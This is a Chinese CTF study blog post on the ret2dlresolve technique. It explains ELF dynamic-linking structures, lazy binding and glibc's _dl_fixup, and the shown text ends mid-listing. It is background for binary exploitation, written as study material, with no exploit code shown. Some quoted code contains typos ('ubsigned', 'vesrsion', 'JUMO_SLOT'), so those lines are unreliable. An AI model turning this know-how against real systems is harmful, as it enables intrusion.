<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>ret2dlresolve | mint1.</title><meta name="author" content="mint"><meta name="copyright" content="mint"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2dlresolve参考资料： https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;advanced-rop&#x2F;ret2dlresolve&#x2F; https:&#x2F;&#x2F;blog.csdn.net&#x2F;seaaseesa&#x2F;article&#x2F;details&#x2F;104478081 Return-to-dl-resolve | BruceFan’s Bl">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dlresolve">
<meta property="og:url" content="http://mint-sec.github.io/2025/05/20/ret2dlresolve/index.html">
<meta property="og:site_name" content="mint1.">
<meta property="og:description" content="ret2dlresolve参考资料： https:&#x2F;&#x2F;ctf-wiki.org&#x2F;pwn&#x2F;linux&#x2F;user-mode&#x2F;stackoverflow&#x2F;x86&#x2F;advanced-rop&#x2F;ret2dlresolve&#x2F; https:&#x2F;&#x2F;blog.csdn.net&#x2F;seaaseesa&#x2F;article&#x2F;details&#x2F;104478081 Return-to-dl-resolve | BruceFan’s Bl">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://mint-sec.github.io/images/Decoration/%E9%9B%85.jpg">
<meta property="article:published_time" content="2025-05-20T04:04:49.000Z">
<meta property="article:modified_time" content="2025-06-11T06:35:12.029Z">
<meta property="article:author" content="mint">
<meta property="article:tag" content="笔记">
<meta property="article:tag" content="栈">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://mint-sec.github.io/images/Decoration/%E9%9B%85.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://mint-sec.github.io/2025/05/20/ret2dlresolve/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":230},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'ret2dlresolve',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-06-11 14:35:12'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/1.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">31</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/null/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/Decoration/%E9%9B%85.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="mint1."><span class="site-name">mint1.</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">ret2dlresolve</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-05-20T04:04:49.000Z" title="发表于 2025-05-20 12:04:49">2025-05-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-11T06:35:12.029Z" title="更新于 2025-06-11 14:35:12">2025-06-11</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">10.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>50分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="ret2dlresolve"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="ret2dlresolve"><a href="#ret2dlresolve" class="headerlink" title="ret2dlresolve"></a>ret2dlresolve</h1><p>参考资料：</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/ret2dlresolve/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/104478081">https://blog.csdn.net/seaaseesa/article/details/104478081</a></p>
<p><a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">Return-to-dl-resolve | BruceFan’s Blog</a></p>
<h1 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h1><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><p>ELF可执行文件由ELF头部、程序头部表和其对应的段、节头部表和其对应的节组成。如果一个可执行文件参与动态链接，它的程序头部表将包含类型为<code>PT_DYNAMIC</code>的段，它包含<code>.dynamic</code>节。结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br></pre></td></tr></table></figure>

<p>其中tag对应着每个节，比如<code>JMPREL</code>对应着<code>.rel.plt</code></p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_10-41-28.png" alt="1"></p>
<p>节中包含目标文件的所有信息。节的结构如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word sh_name;     <span class="comment">//节头部字符串表节区的索引</span></span><br><span class="line">    Elf32_Word sh_type;     <span class="comment">//节类型</span></span><br><span class="line">    Elf32_Word sh_flags;    <span class="comment">//节标志，用于描述属性</span></span><br><span class="line">    Elf32_Addr sh_addr;     <span class="comment">//节的内存映像</span></span><br><span class="line">    Elf32_Off  sh_offset;   <span class="comment">//节的文件偏移</span></span><br><span class="line">    Elf32_Word sh_size;     <span class="comment">//节的长度</span></span><br><span class="line">    Elf32_Word sh_link;     <span class="comment">//节头部表索引链接</span></span><br><span class="line">    Elf32_Word sh_info;     <span class="comment">//附加信息</span></span><br><span class="line">    Elf32_Word sh_addralign;<span class="comment">//节对齐约束</span></span><br><span class="line">    Elf32_Word sh_entsize;  <span class="comment">//固定大小的节表项的长度</span></span><br><span class="line">&#125; Elf32_Shdr</span><br></pre></td></tr></table></figure>

<p>如下图，列出了该文件的31个节区。其中类型为REL的节区包含重定位表项</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-22-06.png" alt="1"></p>
<p>（1）<code>.rel.plt</code>节是用于函数重定位，<code>.rel.dyn</code>节是用于变量重定位</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;    <span class="comment">//对于可执行文件，此值为虚拟地址</span></span><br><span class="line">    Elf32_Word r_info;      <span class="comment">//符号表索引</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_SYM(info) ((info)&gt;&gt;8)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_TYPE(info) ((ubsigned char)(info))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Elf32_R_INFO(sym,type) (((sym)&lt;&lt;8)+(unsigned char)(type))</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-27-43.png" alt="1"></p>
<p>如图，在.rel.plt中列出了链接的C库函数，以下均以write函数为例，write函数的<code>r_offset=0x0804a01c</code>，<code>r_info=0x607</code></p>
<p>（2）<code>.got</code>节保存全局变量偏移表，<code>.got.plt</code>节保存全局函数偏移表。<code>.got.plt</code>对应着<code>Elf32_Rel</code>结构中<code>r_offset</code>的值</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-34-18.png" alt="1"></p>
<p>（3）<code>.dynsym</code>节包含了动态链接符号表，存储了程序中需要被动态链接器解析的符号信息。它包含了符号的类型（如函数、变量）、绑定（如全局、局部）、大小、地址等信息。动态链接器通过解析   .dynsym   中的符号信息，将共享库中的符号与可执行文件中的符号进行绑定。</p>
<p>Elf32_Sym[num]中的num对应着<code>ELF32_R_SYM(Elf32_Rel-&gt;r_info)</code>。根据定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ELF32_R_SYM(Elf32_Rel-&gt;r_info) = (Elf32_Rel-&gt;r_info) &gt;&gt; <span class="number">8</span></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    Elf32_Word st_name;    <span class="comment">// Symbol name(string tbl index)</span></span><br><span class="line">    Elf32_Addr st_value;   <span class="comment">// Symbol value</span></span><br><span class="line">    Elf32_Word st_size;    <span class="comment">// Symbol size</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">// Symbol type and binding</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> st_other;<span class="comment">// Symbol visibility under glibc&gt;=2.2</span></span><br><span class="line">    Elf32_Section st_shndx;<span class="comment">// Section index</span></span><br><span class="line">&#125; Elf32_Sym;</span><br></pre></td></tr></table></figure>

<p>注释：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//符号名称在字符串表中的索引。通过这个索引可以从字符串表中找到符号的名称。</span></span><br><span class="line"><span class="comment">//符号值,对于函数，通常是函数的地址；对于变量，通常是变量的地址。</span></span><br><span class="line"><span class="comment">//符号的大小。例如，函数的指令长度或变量占用的字节数。</span></span><br><span class="line"><span class="comment">//符号的类型和绑定属性。它的值由两个部分组成：符号类型（低4位）和符号绑定（高4位）。</span></span><br><span class="line"><span class="comment">//符号的可见性属性。在 glibc &gt;= 2.2 的系统中，用于控制符号的可见性（例如，是否可以被其他模块访问）</span></span><br><span class="line"><span class="comment">//符号所属的节区（Section）的索引。如果符号未定义或属于特殊节区，该值可能为特定的保留值（如SHN_UNDEF）。</span></span><br></pre></td></tr></table></figure>

<p>write的索引值为ELF32_R_SYM(0x607) &#x3D; 0x607 &gt;&gt; 8 &#x3D; 6。而Elf32_Sym[6]即保存着write的符号表信息。并且ELF32_R_TYPE(0x607) &#x3D; 7，对应<code>R_386_JUMO_SLOT</code>。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-48-52.png" alt="1"></p>
<p>（4）<code>.dynstr</code>节包含了动态链接的字符串(字符串数组)。这个节以<code>\x00</code>作为开始和结尾，中间每个字符串也以<code>\x00</code>间隔。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_11-55-39.png" alt="1"></p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_12-08-43.png" alt="1"></p>
<p>其中0x080481cc为.dynsym节的首地址，0x0804826c为.dynstr节的首地址，0x4c为write在字符串表中的偏移</p>
<p>Elf32_Sym[6]-&gt;st_name&#x3D;0x4c（.dynsym + Elf32_Sym_size * num），所以<code>.dynstr</code>加上0x4c的偏移量，就是字符串write。</p>
<p>（5）<code>.plt</code>节是过程链接表。过程链接表把位置独立的函数调用重定向到绝对位置。</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-22_12-14-48.png" alt="1"></p>
<p>当程序执行call write@plt时，实际会跳到0x0804a01c(.got.plt–&gt;write)去执行</p>
<h2 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h2><p>在linux下，二进制引用的外部符号加载方式有三种，FULL_RELRO、PARTIAL_RELRO、NO_RELRO，在PARTIAL_RELRO和NO_RELRO的情况下，外部符号的地址延迟加载，并且，在NO_RELRO下，ELF的dynamic段可读写。</p>
<p>ELF中有plt表和got表，程序调用动态链接库里的函数时，call的是plt表项，plt表中放着jmp指令，jmp到对应got表中在未第一次调用被调函数时，该函数的got表中并没有存着函数的实际地址</p>
<p>跟进write函数跳转到其plt表中</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-01-18.png" alt="1"></p>
<p>跟进off_80498D4，此时还未加载入write的真实地址</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-02-56.png" alt="1"></p>
<p>跟进loc_80483A6，发现<code>push reloc_arg</code>然后jmp到了plt[0]处</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-05-01.png" alt="1"></p>
<p>跟进sub_8048350 也就是plt[0]，即<code> push linkmap</code> 以及跳转到 <code>_dl_runtime_resolve</code> 函数</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-09-42.png" alt="1"></p>
<p>先push了 linkmap 到栈上</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-10-28.png" alt="1"></p>
<p>又jmp到<code>_dl_runtime_resolve</code>函数</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-12-05.png" alt="1"></p>
<p>其实就是<code>_dl_runtime_resolve</code>接受两个参数，第一个是<code>link_map</code>，通过这个link_map，ld链接器可以访问到dynstr、dynamic、dynsym、rel.plt等所需要的数据地址，而第二个参数<code>reloc_arg</code>，则表明要解析的函数在符号表中是第几个，比如，在这个elf文件里，write在第21个位置，因此push 20<br>调用write后got表中也就存着write的实际地址了</p>
<p><img src="/../images/%E9%AB%98%E7%BA%A7rop/Snipaste_2025-05-20_15-19-52.png" alt="1"></p>
<p>_dl_runtime_resolve是如何工作的呢？我们查看glibc的源码</p>
<p>它的源码在glibc&#x2F;sysdeps&#x2F;x86_64&#x2F;dl-trampoline.h，是直接用汇编写的，我们看到，_dl_runtime_resolve简单的调用了_dl_fixup，因此，我们再去看看_dl_fixup的源码，它的源码在glibc&#x2F;elf&#x2F;dl-runtime.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> reloc_offset  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> reloc_offset reloc_arg  </span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> reloc_index  reloc_arg / sizeof (PLTREL)  </span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">DL_FIXUP_VALUE_TYPE  </span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE  </span><br><span class="line">_dl_fixup (  </span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS  </span></span><br><span class="line">    ELF_MACHINE_RUNTIME_FIXUP_ARGS,  </span><br><span class="line"><span class="meta"># <span class="keyword">endif</span>  </span></span><br><span class="line">    <span class="keyword">struct</span> link_map *l, ElfW(Word) reloc_arg) &#123;  </span><br><span class="line">    <span class="comment">//获取symtab（存放dynsym的数组）  </span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab  </span><br><span class="line">        = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);  </span><br><span class="line">    <span class="comment">//获取strtab(存放符号名的数组)   </span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[DT_STRTAB]);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的rel.plt项   </span></span><br><span class="line">    <span class="type">const</span> PLTREL *<span class="type">const</span> reloc  </span><br><span class="line">        = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  </span><br><span class="line">    <span class="comment">//获取reloc_arg对应的dynsym   </span></span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  </span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Sym)</span> *refsym = sym;  </span><br><span class="line">    <span class="comment">//指向对应的got表，以便将解析结果写回去   </span></span><br><span class="line">    <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);  </span><br><span class="line">    <span class="type">lookup_t</span> result;  </span><br><span class="line">    DL_FIXUP_VALUE_TYPE value;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span>  </span><br><span class="line">    assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not </span></span><br><span class="line"><span class="comment">       used don&#x27;t look in the global scope.  */</span>  </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> =</span> <span class="literal">NULL</span>;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) &#123;  </span><br><span class="line">            <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =  </span><br><span class="line">                (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);  </span><br><span class="line">            ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;  </span><br><span class="line">            version = &amp;l-&gt;l_versions[ndx];  </span><br><span class="line">            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)  </span><br><span class="line">                vesrsion = <span class="literal">NULL</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We need to keep the scope around so do some locking.  This is </span></span><br><span class="line"><span class="comment">        not necessary for objects which cannot be unloaded or when </span></span><br><span class="line"><span class="comment">         we are not using any threads (yet).  */</span>  </span><br><span class="line">        <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P) &#123;  </span><br><span class="line">            THREAD_GSCOPE_SET_FLAG ();  </span><br><span class="line">            flags |= DL_LOOKUP_GSCOPE_LOCK;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_ENABLE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">        <span class="comment">//根据符号名,搜索对应的函数，返回libc基地址，并将符号信息保存到sym中result为libc基地址   </span></span><br><span class="line">        result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,  </span><br><span class="line">                                      version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">/* We are done with the global scope.  */</span>  </span><br><span class="line">        <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)  </span><br><span class="line">            THREAD_GSCOPE_RESET_FLAG ();  </span><br><span class="line">  </span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL  </span></span><br><span class="line">        RTLD_FINALIZE_FOREIGN_CALL;  </span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>  </span></span><br><span class="line">  </span><br><span class="line">        <span class="comment">//value为libc基地址加上要解析函数的偏移地址，也就是实际地址   </span></span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (result,  </span><br><span class="line">                                     sym ? (LOOKUP_VALUE_ADDRESS (result)  </span><br><span class="line">                                            + sym-&gt;st_value) : <span class="number">0</span>);  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">/* And now perhaps the relocation addend.  */</span>  </span><br><span class="line">    value = elf_machine_plt_value (l, reloc, value);  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> (sym != <span class="literal">NULL</span>  </span><br><span class="line">            &amp;&amp; 